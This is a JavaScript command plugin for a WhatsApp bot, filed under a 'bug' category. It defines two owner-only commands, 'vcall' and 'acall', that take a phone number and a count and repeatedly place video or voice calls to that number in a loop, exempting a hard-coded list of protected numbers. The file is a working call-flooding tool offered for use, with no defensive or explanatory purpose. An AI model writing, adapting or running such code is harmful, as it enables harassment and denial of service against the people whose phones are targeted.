const { cmd } = require("../command");
const { sleep } = require("../lib/functions");

const protectedNumbers = ["923096287432","923154647639"]; // Block your number or other VIPs

cmd({
  pattern: "vcall",
  react: '📹',
  desc: "Spam video calls to a target number",
  category: "bug",
  use: ".vcallspam 9476xxxxxxx|count",
  filename: __filename
}, async(conn, mek, m,{from, l, quoted, body, isCmd, umarmd, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
  // ✅ Only bot owner can use
if (!isOwner) return reply("You're not bot owner 🪄.");

  try {
    if (!q) return reply(`📍 *Usage:* ${prefix + command} 9230xxxxxx|count`);
    
    let [numberRaw, countRaw] = q.split("|");
    let targetNumber = numberRaw.replace(/[^0-9]/g, '');
    let jumlahSpam = parseInt(countRaw) || 10;

    if (!targetNumber) return reply("❌ Invalid number format");
    if (protectedNumbers.includes(targetNumber)) return reply("🚫 This number is protected.");

    const jid = targetNumber + "@s.whatsapp.net";
    const exists = await conn.onWhatsApp(jid);
    if (!exists || exists.length === 0) return reply("🚫 This number is not registered on WhatsApp.");

    reply(`📹 SENDING *${jumlahSpam}* VIDEO CALLS TO @${targetNumber}...\nPLEASE WAIT...`, {
      mentions: [jid]
    });

    await sleep(1000);

    for (let i = 0; i < jumlahSpam; i++) {
      try {
        await conn.offerCall(jid, { video: true });
        console.log(`✅ Video call sent to ${jid}`);
      } catch (e) {
        console.error(`❌ Failed to send video call to ${jid}`, e);
      }
      await sleep(2000);
    }

    await conn.sendMessage(from, {
      react: {
        text: '✅',
        key: m.key
      }
    });

  } catch (err) {
    console.error("❌ vcallspam error:", err);
    return reply("❌ Error occurred while processing the video call spam.");
  }
});


cmd({
  pattern: "acall",
  react: '📞',
  desc: "Spam voice calls to a target number",
  category: "bug",
  use: ".callspam 9476xxxxxxx|count",
  filename: __filename
}, async(conn, mek, m,{from, l, quoted, body, isCmd, umarmd, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
  // ✅ Only bot owner can use
  if (!isOwner) return reply("You're not bot owner 🪄.");
  try {
    if (!q) return reply(`📍 *Usage:* ${prefix + command} 923xxxxxx |count`);
    
    let [numberRaw, countRaw] = q.split("|");
    let targetNumber = numberRaw.replace(/[^0-9]/g, '');
    let jumlahSpam = parseInt(countRaw) || 10;

    if (!targetNumber) return reply("❌ Invalid number format");
    if (protectedNumbers.includes(targetNumber)) return reply("🚫 it's your dad number 😏.");

    const jid = targetNumber + "@s.whatsapp.net";
    const exists = await conn.onWhatsApp(jid);
    if (!exists || exists.length === 0) return reply("🚫 This number is not registered on WhatsApp.");

    reply(`📞 Sending *${jumlahSpam}* Voice Calls to @${targetNumber}...\nPlease wait...`, {
      mentions: [jid]
    });

    await sleep(1000);

    for (let i = 0; i < jumlahSpam; i++) {
      try {
        await conn.offerCall(jid, { video: false });
        console.log(`✅ Voice call sent to ${jid}`);
      } catch (e) {
        console.error(`❌ Failed to send voice call to ${jid}`, e);
      }
      await sleep(2000);
    }

    await conn.sendMessage(from, {
      react: {
        text: '✅',
        key: m.key
      }
    });

  } catch (err) {
    console.error("❌ callspam error:", err);
    return reply("❌ Error occurred while processing the voice call spam.");
  }
});